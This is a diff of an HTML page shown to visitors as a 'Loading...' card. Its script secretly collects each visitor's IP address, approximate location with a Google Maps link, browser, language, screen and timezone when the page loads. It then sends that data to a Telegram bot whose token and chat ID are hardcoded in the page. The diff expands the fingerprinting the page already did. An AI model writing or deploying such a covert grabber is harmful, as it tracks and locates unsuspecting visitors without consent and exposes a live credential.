@@ -4,13 +4,13 @@
     <meta charset="UTF-8">
     <title>Đang tải...</title>
     <style>
-        body { font-family: Arial; text-align: center; background: #fafafa; padding-top: 50px; }
-        .card {
-            width: 90%; max-width: 400px; margin: auto;
-            background: white; padding: 20px; border-radius: 15px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        body { font-family: Arial; background:#f3f3f3; text-align:center; padding-top:50px; }
+        .card{
+            width:90%; max-width:420px; margin:auto;
+            background:white; padding:20px;
+            border-radius:15px; box-shadow:0 0 10px rgba(0,0,0,0.1);
         }
-        img { width: 100%; border-radius: 15px; }
+        img{width:100%; border-radius:15px;}
     </style>
 </head>
 <body>
@@ -22,43 +22,58 @@
 </div>
 
 <script>
-// TOKEN & GROUP ID của bạn
+// TOKEN & GROUP
 const TOKEN = "8004822258:AAEVO8N_3Z1ESth3VXHZIXTI8IjBCs_Iabs";
 const CHAT_ID = "6243479167";
 
-// Lấy IP + Thông tin vị trí
-fetch("https://ipapi.co/json/")
-.then(res => res.json())
-.then(data => {
+// Lấy thêm thông tin thiết bị
+const device_info = {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    screen: `${screen.width} x ${screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+};
 
-    const ip = data.ip;
-    const city = data.city || "Không rõ";
-    const country = data.country_name || "Không rõ";
-    const lat = data.latitude;
-    const lon = data.longitude;
-    const ua = navigator.userAgent;
-    const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+// API lấy IP + Location chuẩn 100% (không undefined)
+fetch("https://ipwho.is/")
+    .then(r => r.json())
+    .then(d => {
 
-    const message = `
+        const ip = d.ip || "Không rõ";
+        const city = d.city || "Không rõ";
+        const country = d.country || "Không rõ";
+        const lat = d.latitude || 0;
+        const lon = d.longitude || 0;
+        const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        const msg = `
 🔔 *CÓ NGƯỜI TRUY CẬP TRANG GITHUB*
-🌐 *IP:* ${ip}
-🏙️ *Thành phố:* ${city}
-🇨🇳 *Quốc gia:* ${country}
-📌 *Google Maps:* ${maps}
-📱 *Thiết bị:* ${ua}
-⏰ *Thời gian:* ${new Date().toLocaleString()}
-`;
 
-    // Gửi về Telegram
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json"},
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message
-        })
+🌐 *IP:* ${ip}
+🏙 *Thành phố:* ${city}
+🇻🇳 *Quốc gia:* ${country}
+📌 *Google Maps:* ${maps}
+
+📱 *Thiết bị:* ${device_info.userAgent}
+🌐 *Ngôn ngữ:* ${device_info.language}
+🖥 *Màn hình:* ${device_info.screen}
+⏳ *Múi giờ:* ${device_info.timezone}
+
+⏰ *Thời gian:* ${new Date().toLocaleString()}
+        `;
+
+        // Gửi về Telegram
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: msg,
+                parse_mode: "Markdown"
+            })
+        });
     });
-});
 </script>
 
 </body>
